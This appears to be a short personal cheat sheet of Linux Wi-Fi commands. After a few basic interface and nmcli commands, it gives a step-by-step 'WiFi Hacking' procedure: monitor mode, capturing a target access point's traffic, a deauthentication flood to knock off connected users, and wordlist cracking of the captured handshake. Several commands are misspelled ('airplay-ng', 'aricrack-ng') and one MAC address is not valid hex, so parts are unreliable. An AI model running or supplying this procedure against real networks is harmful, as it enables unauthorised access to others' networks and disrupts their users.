Basic wireless commands:
-iwconfig  (display Wi-Fi interface)
-iwlist wlan0 scan (list all AP your network card reach)
-nmcli dev wifi (views AP) => network manager command line interface
-nmcli dev wifi connect <wifi name> password <wifi-password> (Connect with AP)


---------WiFi Hacking commands--------

To crack the wireless AP, you need the client MAC address, AP MAC address, the channel the target is operating on, and a password list.

Step 1- Monitor Mode (network card should be on monitor mode) & run 'aircrack-ng' command 

Command: airmon-ng start/stop/restart <interface> (airmon-ng start wlan0)

Step 2- Gather crucial information wireless traffic

Command: airodump-ng wlan0

airodump-ng -c 10 --bssid 01:01:AA:88:CC:22 -w <wifi name> wlan0

Above command captures all teh packets traversing the AP on channel 10 using the -c option

In another terminal, you can use the 'airplay-ng' command to knock off (deauthenticate) anyone connected to the AP and force them to reauthenticate to the AP.

Command: airplay-ng --deauth 100 -a 01:01:AA:88:CC:22 -c A0:A3:E2:44:7C:ES wlan0


Finally, in the final terminal you can use a password list (wordlist.dic) to find the password in the captured hash (hacker-arisePSK.cap)

Command: aricrack-ng -w wordlist.dic -b 01:01:AA:88:CC:22 <password hash file>
